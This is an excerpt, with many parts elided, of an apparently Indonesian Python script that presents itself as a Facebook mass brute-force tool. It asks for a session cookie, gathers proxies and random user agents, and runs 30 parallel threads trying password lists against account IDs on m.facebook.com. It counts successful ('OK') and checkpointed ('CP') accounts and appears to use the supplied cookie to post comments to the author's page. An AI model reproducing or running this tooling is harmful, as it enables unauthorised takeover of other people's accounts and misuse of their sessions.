...
def logo(n):
	return str(f"""
   {P} • {K} • {H} • {P}MULTI BRUTE FORCE FACEBOOK{H} ▪︎ {K} ▪︎ {P} ▪︎""")
def logo2():
	return str(f"""
{M}▪︎{K}▪︎{H}▪︎ {P}MENGECEK UNTUK LOGIN {H}▪︎{K}▪︎{M}▪︎""")
...
try:
	clear_layar()
	print(logo2())
	print(f'\r\n [{hh}▪︎{P}] sedang dump proxy dan create useragent')
	...
	sys.exit(f" [{M}▪︎{P}] tidak ada koneksi internet")
...
except:sys.exit(f" [{M}▪︎{P}] gagal dump proxy")
...
#JANGAN UBAH BOT AUTHOR , BOLEH TAMBAH JANGAN DIUBAH !
###---[ LOGIN COOKIE & BOT BAZ ]---###
def login():
	clear_layar()
	print(logo2())
	cookie = input(f"\n [{hh}▪︎{P}] jangan gunakan akun pribadi\n masukkan cookie : ")
	...
	try:
		...
		link = ('https://www.facebook.com/100051967952842/posts/pfbid07LqmAJJctsL8fieFE9MwCFMAYvbkXjJRBDKnuPxd4WWwdmseGGZXGKVnCb6G9DAbl/?app=fbl')
		random_kata = random.choice(["Izin Make Sc Nya Bang","Keren Bang mantap sc nya","Ah Bang Baz Ganteng Banget Deh"])
	...
	except Exception as e:exit(f" [{M}▪︎{P}] cookie invalid")
...
def menu(n,t,c):
	...
	print(' 02. CEK HASIL AKUN ')
	print(' 03. CEK AKUN KENON ')
	print(' 04. CEK OPSI AKUN ')
	print(' 05. LOG OUT COOKIE ')
	ask = input(f' Pilih  : ')
	print(' ─────────────────────────────')
	if ask in ['1','01']:crack_masal(t,c)
	elif ask in ['2','02']:cek_hasil(t,c)
	elif ask in ['3','03']:cek_akun(t,c)
	elif ask in ['4','04']:cek_opsi_cp()
	elif ask in ['5','05']:remove();exit()
	elif ask in ['',' ',]:sys.exit(f" [{M}▪︎{P}] isi yang benar lah kintil")
	else:sys.exit(f" [{M}▪︎{P}] isi yang benar lah kintil")
...
def crack_masal(t,c):
    print(f' [{hh}▪︎{P}] MAKE SURE THE ACCOUNT IS PUBLIC ')
    try:
        bz=0
...
def atur_atur():
	...
	print(f"{P} ─────────────────────────────")
	ch = input(f' [{hh}!{P}] ID NEW (N) ID RANDOM (R) : ')
	if ch in ['o','O']:
		for x in dump:
			id.append(x)
	elif ch in ['n','N']:
	...
	print(f"{P} ─────────────────────────────")
	ch = input(f' [{hh}1{P}] MANUAL [{hh}2{P}] DEFAULT : ')
	...
	with tred(max_workers=30) as babas:
		for akun in id:
			...
			if 'mobile' in metode:
				...
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r [{hh}▪︎{P}] CRACK SELESAI CUY OK:{ok}  CP:{cp} ')
...
def crack(idf,pwx,url,awal):
	...
	print(f"\r [{hh}BAZ{P}] {ahir} %s/%s OK:%s CP:%s"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
	for pw in pwx:
		try:
